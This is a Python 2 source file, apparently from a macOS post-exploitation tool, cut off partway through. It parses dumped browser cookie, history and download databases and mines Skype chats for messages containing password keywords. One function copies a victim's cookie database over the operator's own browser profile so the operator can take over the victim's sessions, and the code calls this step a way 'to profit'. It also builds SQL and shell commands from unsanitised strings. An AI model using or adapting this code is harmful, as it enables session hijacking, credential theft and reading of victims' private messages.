#! /usr/bin/python
# -*- coding: iso-8859-15 -*-




import sys, os
import time
import os.path
import re
import sqlite3 as lite
import time,datetime
import commands
import thread
import plistlib
import shutil


############################################
#[Variables Initialization]
############################################
dir_results = "results/"

#directory for database
conf_client = "analysis/conf_client.txt"

#database of dump module
dir_db = "db/"

#keyword pass database
db_web_pass = dir_db + "z_web_pass.input"
file_password_personnal = dir_db + 'z_mypasswords.input'
db_keywords_pass = dir_db + "z_keywords_pass.input"

#tag, see history_net_sys.db
tag_dir_Webpage = "WebpagePreview"

#tools path
dir_tools = "tools/"

#john the ripper
#dir_path_jtr='tools/jtr/JTR-1.7.9-jumbo5-OSX-Universal/'
dir_path_jtr = "tools/jtr/magnum-jumbo/run/"
file_wordlist_for_jtr = dir_db + "z_mypasswords.input"
time_sec_to_jtr = "10"

#current_path
current_path = os.getcwd()

#Checkout4Mac path
CheckOut4Mac_path = 'tools/CheckOut4Mac/chk4mac_0.2.py'

#SLK and AHJP path
path_to_mactime = 'tools/disk_utilities/mactime'
path_to_ahjp = 'tools/AHJP/ahjp_cli_beta_osx'
name_ahjp = 'ahjp_cli_beta_osx'

#list of results directory
tab_ls_results = []

for file in os.listdir(dir_results):
	if "DS_Store" not in file:
		tab_ls_results.append(file)



############################################
#[Functions]
############################################
def print_red(text) :
	print ('\033[22;31m' + text + '\033[0;m')
		
def print_in(text) :
	print ('\033[0;34m' + text + '\033[1;m')

def print_green(text) :
	print ('\033[22;32m' + text + '\033[0;m')

def print_log(text) :
	print ('\033[0;38m' + text + '\033[1;m')


#[create file]
############################################
def fct_writefile(var_x, file_x):
	file = open(file_x,'a')
	file.write(var_x)
	file.close()
	
def fct_writefile_del(var_x, file_x):
	file = open(file_x,'w')
	file.write(var_x)
	file.close()
############################################


#add to password database analysis
############################################
def fct_add_pass_database(passwords):
	fct_writefile(passwords, file_password_database_analysis)
############################################


#generate main password database
############################################
def fct_generate_password(just_found):
	
	tab_pass = []
	#ALL-password1
	if os.path.exists(file_password_database):
		file_password1 = open(file_password_database,'r')
		lines_password_file1 = file_password1.readlines()
		file_password1.close()
		for index_file1 in range(len(lines_password_file1)):
			tab_pass.append(lines_password_file1[index_file1])

	#ALL-password2
	if os.path.exists(file_password_database_analysis):
		file_password2 = open(file_password_database_analysis,'r')
		lines_password_file2 = file_password2.readlines()
		file_password2.close()
		for index_file2 in range(len(lines_password_file2)):
			tab_pass.append(lines_password_file2[index_file2])

	if just_found == 0:
		#personnal password
		if os.path.exists(file_password_personnal): 
			file_password3 = open(file_password_personnal,'r')
			lines_password_file3 = file_password3.readlines()
			file_password3.close()
			for index_file3 in range(len(lines_password_file3)):
				tab_pass.append(lines_password_file3[index_file3])

	#concatenation password
	tab_pass = sorted(set(tab_pass))
	return tab_pass
############################################



####################################################################################################################################
											#[read and inject cookies]
####################################################################################################################################

#connect to sqlite and display cookies display
def fct_display_cookie(browser,db_src_path,output_display_cookies):
	if browser == "FIREFOX" or browser == "CHROME":
		con = None
		try:
		    con = lite.connect(db_src_path)
		    with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				
				#If Firefox
				if browser == "FIREFOX":
					sql_request="select lastAccessed,Host,Name,expiry from moz_cookies order by lastAccessed DESC"
					cur.execute(sql_request)
					rows = cur.fetchall()

					counter = 0
					jump = 0
					for row in rows:
						lastAccessed=str(row["lastAccessed"])
						expiry=str(row["expiry"])
						if lastAccessed == "None" or expiry == "None":
							request = "Host:%s Name:%s" % (row["Host"], row["Name"])
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display_cookies)
						else: 
							request = "Host:%s Name:%s Last Access:%s Expiration:%s" % (row["Host"], row["Name"], datetime.datetime.fromtimestamp(int(lastAccessed[0:10])).strftime('%Y-%m-%d %H:%M:%S'), datetime.datetime.fromtimestamp(int(expiry[0:10])).strftime('%Y-%m-%d %H:%M:%S'))
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display_cookies)

						counter = counter + 1
						if counter == 50 and jump == 0: 
							res = raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1
				
				#if Chrome
				else:
					sql_request = "select last_access_utc,expires_utc,host_key,name from cookies order by last_access_utc DESC"
					cur.execute(sql_request)
					rows = cur.fetchall()

					counter = 0
					jump = 0
					for row in rows:
						lastAccessed = str(row["last_access_utc"])
						expiration = str(row["expires_utc"])

						#xcode format + strip
						lastAccessed = int(lastAccessed)/1000000 - 11644473600
						filtre_size=re.compile('([0-9]{10,10})',re.IGNORECASE)
						res = filtre_size.findall(str(lastAccessed))
						for lastAccessed_formated in res:
							lastAccessed = lastAccessed_formated
						 
						expiration = int(expiration)/1000000 - 11644473600
						filtre_size=re.compile('([0-9]{10,10})',re.IGNORECASE)
						res = filtre_size.findall(str(expiration))
						for expiration_formated in res:
							expiration = expiration_formated

						if lastAccessed == "None" or expiration == "None" or lastAccessed < 1900 or expiration < 1900 :
							request = "Host:%s Name:%s" % (row["host_key"], row["name"])
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display_cookies)
						else:
							request = "Host:%s Name:%s Last Access:%s Expiration:%s" % (row["host_key"], row["name"], datetime.datetime.fromtimestamp(int(lastAccessed)).strftime('%Y-%m-%d %H:%M:%S'), datetime.datetime.fromtimestamp(int(expiration)).strftime('%Y-%m-%d %H:%M:%S'))
							print_green(request)
							to_record = "\n" + request.encode('utf-8')
							fct_writefile(to_record, output_display_cookies)
						
						counter = counter + 1
						if counter == 50 and jump == 0: 
							res=raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1
								 
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])	
		finally:
		    if con:
		        con.close()
	
	#If Safari
	elif browser == "SAFARI":
		counter = 0
		jump = 0
		print_red("Displaying not available :(")
		counter = counter + 1
		if counter == 50 and jump == 0: 
			res = raw_input("Press enter to continue (j to jump) > ")
			counter = 0
			if res == 'j':
				jump = 1

	#If Opera
	elif browser == "OPERA": 
		counter = 0
		jump = 0
		print_red("Displaying not available :(")
		counter = counter + 1
		if counter == 50 and jump == 0: 
			res = raw_input("Press enter to continue (j to jump) > ")
			counter = 0
			if res == 'j':
				jump = 1

	print_log("\nResults are stored into " + output_display_cookies + "\n")
	raw_input("Press any key to continue...")


#read and inject cookie from results to your browser
def fct_xploit_cookies(browser,output_display_cookies):

	#verification if cookies have been dumped
	print_red("\n========================================================================")
	print_red("                                 " + browser)
	print_red("========================================================================")
	print_log("[COOKIES_" + browser + "] Following Cookies are available > ")
	fct_writefile("\n\n====================================\n" + browser + "\n====================================\n", output_display_cookies)


	file=open(file_log_browser,'r')
	lines_log_browser=file.readlines()
	file.close()

	l = 0
	tab_cookies = []
	filtre=re.compile('^.+\ to\ (.+cookies_' + browser + '.+)$',re.IGNORECASE)

	for i in range(len(lines_log_browser)):
		res=filtre.findall(lines_log_browser[i])
		for db_src_path in res:
			tab_cookies.append(db_src_path)
			print_green("========================================================================")
			print_log("Profil ID " + str(l) + " : " + db_src_path)
			print_green("========================================================================")
			fct_writefile("\nProfil ID " + str(l) + " : " + db_src_path + "\n====================================\n", output_display_cookies)
			raw_input()
			l = l + 1
			
			#connect to sqlite and display cookies display
			fct_display_cookie(browser,db_src_path,output_display_cookies)
			
	#inject to your browser, if cookie database previously identified
	if l >= 1 :
		print_green("\n========================================================================")
		inject_or_not = raw_input("Do you want to copy " + browser + " cookies within your browser ? y/[n] > ")
		
		if inject_or_not == "y":			
			#if severeal profil
			if len(tab_cookies) > 1:
				browser_profil=raw_input("Please to choose ID to inject into your browser > ")
				db_src_path = tab_cookies[int(browser_profil)]

			#if one profil
			else: 
				db_src_path = tab_cookies[0]

			#replace original cookies by dumped cookies
			file = open(conf_client,'r')
			lines_conf_client=file.readlines()
			file.close()
			match_browser = "[" + browser + "_COOKIE]"

			for i in range(len(lines_conf_client)):
				if match_browser in lines_conf_client[i]:
					if browser == "FIREFOX" :
						filtre = re.compile('^\[FIREFOX_COOKIE\](.+)',re.IGNORECASE)
					elif browser == "CHROME" :
						filtre = re.compile('^\[CHROME_COOKIE\](.+)',re.IGNORECASE)
					elif browser == "SAFARI" :
						filtre = re.compile('^\[SAFARI_COOKIE\](.+)',re.IGNORECASE)
					elif browser == "OPERA" :
						filtre = re.compile('^\[OPERA_COOKIE\](.+)',re.IGNORECASE)
					res = filtre.findall(lines_conf_client[i])
					for j in res:
						if os.path.isfile(j):
							shutil.copyfile(db_src_path,j)
							print_green("\nYour " + browser + " cookies have been replaced with success ... ")
							print_green("... to " + j + "\n")
							print_log("[\COOKIES_" + browser + "] Launch your " + browser + " browser to profit")
						else : print_red(j + " is not available\nPlease to check " + conf_client + " file")
						print_green("========================================================================")

		else: 
			print_log("\n[\COOKIES_" + browser + "] Your " + browser + " Cookies have not been replaced ...")
			print_green("========================================================================")
		
	#exit, if no cookie database previously identified
	else: 
		print_log("\n[\COOKIES_" + browser + "] No " + browser + " Cookies has been identified ...")
		print_green("========================================================================")



####################################################################################################################################
											#[read browser history]
####################################################################################################################################
##HISTORY (1/2)
#connect to sqlite and display history display
def fct_display_history(browser,db_src_path,output_display_history):
	if browser == "FIREFOX" or browser == "CHROME":
		con = None
		try:
		    con = lite.connect(db_src_path)
		    with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				
				#if Firefox
				if browser == "FIREFOX":
					sql_request = "select title,url,last_visit_date from moz_places order by last_visit_date DESC"
					cur.execute(sql_request)
					rows = cur.fetchall()

					counter = 0
					jump = 0
					for row in rows:
						Last_Visit = str(row["last_visit_date"])
						if Last_Visit == "None" :
							request = "\nTitle:%s \nURL:%s\n" % (row["title"], row["url"])
							print_green(request)
							to_record = request.encode('utf-8')
							fct_writefile(to_record, output_display_history)
						else:
							request = "\nTitle:%s \nURL:%s \nLast Visit:%s\n" % (row["title"], row["url"], datetime.datetime.fromtimestamp(int(Last_Visit[0:10])).strftime('%Y-%m-%d %H:%M:%S'))
							print_green(request)
							to_record = request.encode('utf-8')
							fct_writefile(to_record, output_display_history)

						counter = counter + 1
						if counter == 10 and jump == 0 : 
							res = raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1
				#if Chrome
				else:
					sql_request="select last_visit_time,title,url from urls order by last_visit_time DESC"
					cur.execute(sql_request)
					rows = cur.fetchall()

					counter = 0
					jump = 0
					for row in rows:
						Last_Visit=str(row["last_visit_time"])
						#xcode format
						Last_Visit=int(Last_Visit)/1000000 - 11644473600
						filtre_size=re.compile('([0-9]{10,10})',re.IGNORECASE)
						res = filtre_size.findall(str(Last_Visit))
						for Last_Visit_formated in res:
							Last_Visit = Last_Visit_formated

						if Last_Visit == "None" or int(Last_Visit) < 1900:
							print_green("\nTitle:%s \nURL:%s\n" % (row["title"], row["url"]))
							to_record="\nTitle:%s \nURL:%s\n" % (row["title"], row["url"])
							to_record=to_record.encode('utf-8')
							fct_writefile(to_record, output_display_history)
						else: 
							print_green("\nTitle:%s \nURL:%s \nLast Visit:%s\n" % (row["title"], row["url"], datetime.datetime.fromtimestamp(int(Last_Visit)).strftime('%Y-%m-%d %H:%M:%S')))
							to_record="\nTitle:%s \nURL:%s \nLast Visit:%s\n" % (row["title"], row["url"], datetime.datetime.fromtimestamp(int(Last_Visit)).strftime('%Y-%m-%d %H:%M:%S'))
							to_record=to_record.encode('utf-8')
							fct_writefile(to_record, output_display_history)

						counter = counter + 1
						if counter == 10 and jump == 0: 
							res=raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])	
		finally:
		    if con:
		        con.close()
	
	#if Safari
	elif browser == "SAFARI": 
		if os.path.exists(db_src_path + ".xml"):
			print_log("Binary file already converted to XML ...")
		else :
			os.system("plutil -convert xml1 -o " + db_src_path + ".xml " + db_src_path)
		hist_safari_xml = plistlib.readPlist(db_src_path + ".xml")
		file = open(db_src_path + ".xml",'r')
		lines = file.readlines()
		file.close()

		taglVD = 0
		tagrURL = 0
		tagTitle = 0
		tagURL = 0
		
		#parsing of XML file
		counter = 0
		jump = 0
		for i in range(len(lines)):
			if "<key></key>" in lines[i]:
				tagURL = 1
				counter = counter + 1
				continue
			if tagURL == 1 and "string" in lines[i]:
				filtre = re.compile('\<string\>(.+)\<\/string\>',re.IGNORECASE)
				res = filtre.findall(lines[i])
				for j in res:
					print_green("From : " + j)
					fct_writefile("\n\nFrom : " + j, output_display_history)
				tagURL = 0				
			
			if "title" in lines[i]:
				tagTitle = 1
				continue			
			if tagTitle == 1 and "string" in lines[i]:
				filtre = re.compile('\<string\>(.+)\<\/string\>',re.IGNORECASE)
				res = filtre.findall(lines[i])
				for j in res:
					print_green("Title : " + j + "\n")
					fct_writefile("\nTitle : " + j + "\n", output_display_history)
				tagTitle = 0				
						
			if "lastVisitedDate" in lines[i]:
				taglVD = 1
				continue
			if taglVD == 1 and "string" in lines[i]:
				filtre = re.compile('\<string\>(.+)\<\/string\>',re.IGNORECASE)
				res = filtre.findall(lines[i])
				for j in res:
					date = str(978307200 + int(float(j)))
					date = datetime.datetime.fromtimestamp(int(date[0:10])).strftime('%Y-%m-%d %H:%M:%S')
					print_green("Last Visit: " + str(date))
					fct_writefile("\nLast Visit: " + str(date), output_display_history)
				taglVD = 0

			if "redirectURLs" in lines[i]:
				tagrURL = 1 
				continue
			if tagrURL == 1 and "array" in lines[i]:
				continue
			if tagrURL == 1 and "string" in lines[i]:
				filtre = re.compile('\<string\>(.+)\<\/string\>',re.IGNORECASE)
				res = filtre.findall(lines[i])
				for j in res:
					print_green("URL: " + j)
					fct_writefile("\nURL: " + j, output_display_history)
				tagrURL = 0
			if counter == 10 and jump == 0: 
				res = raw_input("Press enter to continue (j to jump) > ")
				counter = 0
				if res == 'j':
					jump = 1
		
		os.system("rm " + db_src_path + ".xml")
		
		#creation of tab_ls_history_net_sys
		if os.path.exists(dir_dump_history_net_sys):
			tab_ls_history_net_sys = []
		for file in os.listdir(dir_dump_history_net_sys):
			tab_ls_history_net_sys.append(file)

		safari_exist = 0
		tab_results = []
		for i in range(len(tab_ls_history_net_sys)):
			if tag_dir_Webpage in tab_ls_history_net_sys[i]:
				tab_results.append(tab_ls_history_net_sys[i])
				safari_exist = 1

		if safari_exist == 1:
			display_webpage_prev = raw_input("\nDo you want to display Safari Webpages Previews ? y/[n] > ")
			if display_webpage_prev == "y":
				for i in range(len(tab_results)):
					os.popen("open -a preview " + dir_dump_history_net_sys + tab_results[i].strip("\n") + "/*.png")
					os.popen("open -a preview " + dir_dump_history_net_sys + tab_results[i].strip("\n") + "/*.jpeg")
	
	#if Opera
	elif browser == "OPERA": 
		counter = 0
		jump = 0
		print_red("Displaying not available :(")
		counter = counter + 1
		if counter == 10 and jump == 0: 
			res = raw_input("Press enter to continue (j to jump)")
			counter = 0
			if res == 'j':
				jump = 1

	print_log("\nResults are stored into " + output_display_history + "\n")
	raw_input("Press any key to continue...")

##HISTORY (2/2)
#read history from results to your browser
def fct_read_history(browser,output_display_history):

	#verification if history have been dumped
	print_red("\n========================================================================")
	print_red("                                 " + browser)
	print_red("========================================================================")
	print_log("[PLACES_" + browser + "] Following Browser History is available  > ")
	fct_writefile("\n\n====================================\n" + browser + "\n====================================\n", output_display_history)
	
	file = open(file_log_browser,'r')
	lines_log_browser = file.readlines()
	file.close()

	l = 0
	tab_history = []
	filtre = re.compile('^.+\ to\ (.+places_' + browser + '.+)$',re.IGNORECASE)

	for i in range(len(lines_log_browser)):
		res = filtre.findall(lines_log_browser[i])
		for db_src_path in res:
			tab_history.append(db_src_path)
			print_green("========================================================================")
			print_log("Profil ID " + str(l) + " : " + db_src_path)
			print_green("========================================================================")
			fct_writefile("\nProfil ID " + str(l) + " : " + db_src_path + "\n====================================\n", output_display_history)
			raw_input()
			l = l + 1
	
			fct_display_history(browser,db_src_path,output_display_history)
			
	#inject to your browser, if cookie database previously identified
	if l >= 1 :
		print_green("========================================================================")
		inject_or_not = raw_input("Do you want to copy " + browser + " history within your browser ? y/[n] > ")
		
		if inject_or_not == "y" :			
			#if severeal profil
			if len(tab_history) > 1 :
				browser_profil = raw_input("Please to choose ID to inject into your browser > ")
				db_src_path = tab_history[int(browser_profil)]

			#if one profil
			else : 
				db_src_path = tab_history[0]

			file = open(conf_client,'r')
			lines_conf_client = file.readlines()
			file.close()
			match_browser = "[" + browser + "_HISTORY]"

			for i in range(len(lines_conf_client)):
				if match_browser in lines_conf_client[i]:
					if browser == "FIREFOX":
						filtre = re.compile('^\[FIREFOX_HISTORY\](.+)',re.IGNORECASE)
					elif browser == "CHROME":
						filtre = re.compile('^\[CHROME_HISTORY\](.+)',re.IGNORECASE)
					elif browser == "SAFARI":
						filtre = re.compile('^\[SAFARI_HISTORY\](.+)',re.IGNORECASE)
					elif browser == "OPERA":
						filtre = re.compile('^\[OPERA_HISTORY\](.+)',re.IGNORECASE)
					res = filtre.findall(lines_conf_client[i])
					for j in res:
						if os.path.isfile(j):
							shutil.copy(db_src_path,j)
							print_green("\nYour " + browser + " history have been replaced with success ... ")
							print_green("... to " + j + "\n")
							print_green("[\HISTORY_" + browser + "] Launch your " + browser + " browser to profit")
						else:
							print_red(j + " is not available\nPlease to check " + conf_client + " file")
						print_green("========================================================================")
		else: 
			print_log("\n[\PLACES_" + browser + "] Your " + browser + " History have not been replaced ...")
			print_green("========================================================================")
		
	else: 
		print_log("\n[\PLACES_" + browser + "] No " + browser + " History has been identified ... History.db (results/browser_dump/PLACES_SAFARI_<user>_History.db) are not still converted ... sorry :(")
		print_green("========================================================================")



####################################################################################################################################
											#[read browser download]
####################################################################################################################################
			
##DOWNLOAD HISTORY (1/2)
#connect to sqlite and display history display
def fct_display_downloaded(browser,db_src_path,output_display_download):
	if browser == "FIREFOX" or browser == "CHROME":
		con = None
		try:
		    con = lite.connect(db_src_path)
		    with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				
				#if Firefox
				if browser == "FIREFOX":
					sql_request = "select startTime,source,target from moz_downloads order by startTime DESC"
					cur.execute(sql_request)
					rows = cur.fetchall()

					counter = 0
					jump = 0
					for row in rows:
						Start_Time = str(row["startTime"])
						if Start_Time == "None" :
							request = "\nURL:%s \nStored in: %s\n" % (row["source"], row["target"])
							print_green(request)
							to_record = request.encode('utf-8')
							fct_writefile(to_record, output_display_download)
						else : 
							request = "\nURL:%s \nStored in: %s \nStart Time: %s\n" % (row["source"], row["target"], datetime.datetime.fromtimestamp(int(Start_Time[0:10])).strftime('%Y-%m-%d %H:%M:%S'))
							print_green(request)
							to_record = request.encode('utf-8')
							fct_writefile(to_record, output_display_download)

						counter = counter + 1
						if counter == 10 and jump == 0: 
							res = raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump = 1
				#if Chrome
				else:
					sql_request = "select * from downloads order by start_time DESC LIMIT 1"
					cur.execute(sql_request)
					rows = cur.fetchall()

					counter = 0
					jump = 0

					#check just first recording (with LIMIT 1)
					for row in rows:
						#tab_names_column = str(row.keys())

						#old Chrome database 
						if "full_path" in str(row.keys()):
							sql_request = "select url,full_path,start_time from downloads ORDER BY start_time DESC"
							version_db = "old"

						#new Chrome database
						else:
							sql_request = "select downloads.id,downloads_url_chains.id,downloads.current_path,downloads_url_chains.url,downloads.start_time from downloads,downloads_url_chains WHERE (downloads_url_chains.id=downloads.id) ORDER BY start_time DESC"
							version_db = "new"

					cur.execute(sql_request)
					rows = cur.fetchall()

					for row in rows:
						Start_Time = str(row["start_time"])
						#xcode format
						Start_Time = int(Start_Time)/1000000 - 11644473600
						filtre_size=re.compile('([0-9]{10,10})',re.IGNORECASE)
						res = filtre_size.findall(str(Start_Time))
						for Start_Time_formated in res:
							Start_Time = Start_Time_formated

						if Start_Time == "None" or int(Start_Time) < 1900:
							if version_db == "old":
								request = "\nURL: %s \nStored in: %s\n" % (row["url"], row["full_path"])
							else:
								request = "\nURL: %s \nStored in: %s\n" % (row["url"], row["current_path"])
							
							print_green(request)
							to_record = request.encode('utf-8')
							fct_writefile(to_record, output_display_download)

						else: 
							if version_db == "old":
								request = "\nURL: %s \nStored in: %s \nStart Time:%s\n" % (row["url"], row["full_path"], datetime.datetime.fromtimestamp(int(Start_Time)).strftime('%Y-%m-%d %H:%M:%S'))
							else:
								request = "\nURL: %s \nStored in: %s \nStart Time: %s\n" % (row["url"], row["current_path"], datetime.datetime.fromtimestamp(int(Start_Time)).strftime('%Y-%m-%d %H:%M:%S'))
							
							print_green(request)
							to_record = request.encode('utf-8')
							fct_writefile(to_record, output_display_download)

						counter = counter + 1
						if counter == 10 and jump == 0 : 
							res = raw_input("Press enter to continue (j to jump) > ")
							counter = 0
							if res == 'j':
								jump=1
		except lite.Error, e:	    
		    print_red("Error %s:" % e.args[0])
		finally:
		    if con:
		        con.close()

	#If Safari
	elif browser == "SAFARI": 
		if os.path.exists(db_src_path + ".xml"):
			print_log("Binary file already converted to XML ...")
		else:
			os.system("plutil -convert xml1 -o " + db_src_path + ".xml " + db_src_path)
		hist_safari_xml=plistlib.readPlist(db_src_path + ".xml")
		file = open(db_src_path + ".xml",'r')
		lines = file.readlines()
		file.close()

		tagl = 0
		tagURL = 0
		tagStore=0


		#parsing of XML file
		counter = 0
		jump = 0
		for i in range(len(lines)) :
			if "DownloadEntryURL" in lines[i]:
				tagURL = 1
				counter = counter + 1
				continue
			if tagURL == 1 and "string" in lines[i]:
				filtre=re.compile('\<string\>(.+)\<\/string\>',re.IGNORECASE)
				res=filtre.findall(lines[i])
				for j in res:
					print_green("URL : " + j)
					fct_writefile("\nURL : " + j + "\n", output_display_download)
				tagURL = 0				
			
			if "DownloadEntryPath" in lines[i] :
				tagStore=1
				counter = counter + 1
				continue		
			if tagStore==1 and "string" in lines[i] :
				filtre=re.compile('\<string\>(.+)\<\/string\>',re.IGNORECASE)
				res=filtre.findall(lines[i])
				for j in res:
					print_green("\nStored in : " + j)
					fct_writefile("\nStored in : " + j, output_display_download)
				tagStore=0				
				
			if counter == 10 and jump == 0: 
				res=raw_input("Press enter to continue (j to jump) > ")
				counter = 0
				if res == 'j':
					jump = 1

		os.system("rm " + db_src_path + ".xml")

	#If Opera
	elif browser == "OPERA": 
		counter = 0
		jump = 0
		print_red("Displaying not available :(")
		counter = counter + 1
		if counter == 10 and jump == 0: 
			res=raw_input("Press enter to continue (j to jump)")
			counter = 0
			if res == 'j':
				jump = 1

	print_log("\nResults are stored into " + output_display_download + "\n")
	raw_input("Press any key to continue...")

##DOWNLOAD HISTORY (2/2)
#read download history from results to your browser
def fct_read_down_history(browser, output_display_download) :
	#verification if history have been dumped
	print_red("\n========================================================================")
	print_red("                                 " + browser)
	print_red("========================================================================")
	print_log("[DOWNLOADS_" + browser + "] Following Downloads History is available  > ")
	fct_writefile("\n\n====================================\n" + browser + "\n====================================\n", output_display_download)


	file = open(file_log_browser,'r')
	lines_log_browser = file.readlines()
	file.close()

	l = 0
	tab_history = []
	filtre = re.compile('^.+\ to\ (.+downloads_' + browser + '.+)$',re.IGNORECASE)

	for i in range(len(lines_log_browser)):
		res = filtre.findall(lines_log_browser[i])
		for db_src_path in res:
			tab_history.append(db_src_path)
			print_green("========================================================================")
			print_log("Profil ID " + str(l) + " : " + db_src_path)
			print_green("========================================================================")
			fct_writefile("\nProfil ID " + str(l) + " : " + db_src_path + "\n====================================\n", output_display_download)
			raw_input()
			l = l + 1
			
			#connect to sqlite and display cookies display
			fct_display_downloaded(browser,db_src_path,output_display_download)
	
	if l == 0: 
			print_green("========================================================================")
			print_log("[\DOWNLOADS_" + browser + "] No " + browser + " Downloads has been identified ...")
			print_green("========================================================================")



####################################################################################################################################
											#[Exploit Skype]
####################################################################################################################################
def fct_exploit_skype():
	print_red("\n\n========================================================================")
	print_red("                 ==== Exploit Skype messages ====")
	print_red("========================================================================")

	if os.path.exists(file_log_skype):

		file=open(file_log_skype,'r')
		lines_log_skype = file.readlines()
		file.close()

		tab_results = []
		
		filtre = re.compile('^.+\ to\ (.+)\/(.+)$',re.IGNORECASE)
		for i in range(len(lines_log_skype)):
			res = filtre.findall(lines_log_skype[i])
			for one_line in res:
				path_file_db = one_line[0]
				file_db = one_line[1]
				tab_results.append(file_db)
			
		db_skype_to_analyse = "null"
		while db_skype_to_analyse == "null":
			
			print_log("\nAvailable Skype Database files > ")
			for j in range(len(tab_results)):print_green(str(j) + ". " + tab_results[j])
			
			db_skype_to_analyse = raw_input("\nChoose a Skype database (b to back) > ")
			if db_skype_to_analyse != "b":
				try:
					intORnot=int(db_skype_to_analyse)
					if int(db_skype_to_analyse) < len(tab_results):
						skype_name = tab_results[int(db_skype_to_analyse)]
						db_skype_to_analyse = path_file_db + "/" + skype_name

						var_analysis = "null"
						while var_analysis == "null": 
							print_log  ("\nAnalysis of : " + db_skype_to_analyse)
							print_green("========================================================================")
							print_green("1: Display/Record all recorded messages")
							print_green("2: Display/Record all messages containing secret information")
							print_green("3: Display/Record all messages containing a special keyword")
							print_green("b: Back")
							var_analysis=raw_input("\nAnalysis to launch > ")
							if var_analysis == "1": 
								fct_read_all_skype(db_skype_to_analyse)
								var_analysis = "null"
							elif var_analysis == "2": 
								fct_read_pass_skype(db_skype_to_analyse)
								var_analysis = "null"
							elif var_analysis == "3": 
								fct_read_special_skype(db_skype_to_analyse)
								var_analysis = "null"
							elif var_analysis == "b": 
								db_skype_to_analyse = "null"
							else:
								var_analysis = "null"
								print_red("\nPlease to choose a valid option\n")

					else:
						print_red("\nPlease to choose a valid Skype database\n")
						db_skype_to_analyse = "null"

				except ValueError:
					print_red("\nPlease to choose a valid Skype database\n")
					db_skype_to_analyse = "null"

	else:
		print_log("No recording ...")
	print_red("\n========================================================================")
	print_red("                 ==== \Exploit Skype messages ====")
	print_red("========================================================================")


def fct_read_all_skype(db_skype_to_analyse) :
	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_SKYPE_ALL.txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	id_prec = 999999999999999 
	con = None
	try:
	    con = lite.connect(db_skype_to_analyse)
	    with con:
			con.row_factory = lite.Row
			cur = con.cursor()
			#SELECT extprop_chatmsg_ft_index_timestamp,author,body_xml,chatname FROM Messages ;
			sql_request = "SELECT id,convo_id,extprop_chatmsg_ft_index_timestamp,author,body_xml,chatname FROM Messages ORDER BY id DESC"
			cur.execute(sql_request)
			rows = cur.fetchall()
			counter = 0
			jump = 0
			for row in rows:
				if int(row["convo_id"]) != id_prec:
					extprop_chatmsg_ft_index_timestamp=str(row["extprop_chatmsg_ft_index_timestamp"])
					if extprop_chatmsg_ft_index_timestamp == "None":
						request = "\n\n[chatname]:%s\nConversation:%s" % (row["chatname"],row["convo_id"])
						print_log(request)
						to_record = request.encode('utf-8')
						fct_writefile(to_record, output_display)
					else:
						request = "\n\n[chatname]:%s\nDate:%s\nConversation:%s" % (row["chatname"],datetime.datetime.fromtimestamp(int(extprop_chatmsg_ft_index_timestamp[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["convo_id"])
						print_log(request)
						to_record=request.encode('utf-8')
						fct_writefile(to_record, output_display)

				else:
					request = "\nAuthor:%s \n  Message:%s" % (row["author"], row["body_xml"])
					print_green(request)
					to_record = request.encode('utf-8')
					fct_writefile(to_record, output_display)

				id_prec = row["convo_id"]

				counter = counter+1
				if counter == 5 and jump == 0: 
					res = raw_input("Press enter to continue (j to jump) > ")
					counter = 0
					if res == 'j':
						jump = 1

	except lite.Error, e:	    
	    print_red("Error %s:" % e.args[0])
	finally:
	    if con:
	        con.close()

	print_log("\nResults are stored into " + output_display + "\n")
	raw_input("Press any key to continue...")


def fct_read_pass_skype(db_skype_to_analyse):
	#to record
	var_date_display = time.strftime('%y%m%d-%Hh%M%S',time.localtime())
	output_display = name_dir_analysis + var_date_display + "_SKYPE_PASS.txt"
	print_log("\nResults will be stored into " + output_display + "\n")
	raw_input("Press any key to continue...")

	file = open(db_keywords_pass,'r')
	lines_keywords_pass = file.readlines()
	file.close()

	for j in range(len(lines_keywords_pass)):
		con = None
		try:
		    con = lite.connect(db_skype_to_analyse)
		    with con:
				con.row_factory = lite.Row
				cur = con.cursor()
				print_log("\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n"))
				fct_writefile("\n====================================\n[Wanted Keyword] : " + lines_keywords_pass[j].strip("\n") + "\n====================================", output_display)
				raw_input()
				#SELECT extprop_chatmsg_ft_index_timestamp,author,body_xml,chatname FROM Messages where body_xml LIKE '%passw%';
				sql_request = "SELECT id,extprop_chatmsg_ft_index_timestamp,author,body_xml,chatname FROM Messages where body_xml LIKE '%" + lines_keywords_pass[j].strip('\n') + "%' ORDER BY id DESC"
				cur.execute(sql_request)
				rows = cur.fetchall()
				counter = 0
				jump = 0
				for row in rows:
					id_skype_plus=int(row["id"]) + 1
					extprop_chatmsg_ft_index_timestamp=str(row["extprop_chatmsg_ft_index_timestamp"])
					if extprop_chatmsg_ft_index_timestamp == "None" : 
						request = "[chatname]:%s \nAuthor:%s \n  Message:%s" % (row["chatname"], row["author"],row["body_xml"])
						print_green(request)
						to_record = "\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)
					else:
						request = "[chatname]:%s \nDate:%s \nAuthor:%s \n  Message:%s" % (row["chatname"],datetime.datetime.fromtimestamp(int(extprop_chatmsg_ft_index_timestamp[0:10])).strftime('%Y-%m-%d %H:%M:%S'),row["author"],row["body_xml"])
						print_green(request)	
						to_record = "\n\n" + request.encode('utf-8')
						fct_writefile(to_record, output_display)

					#display next of message
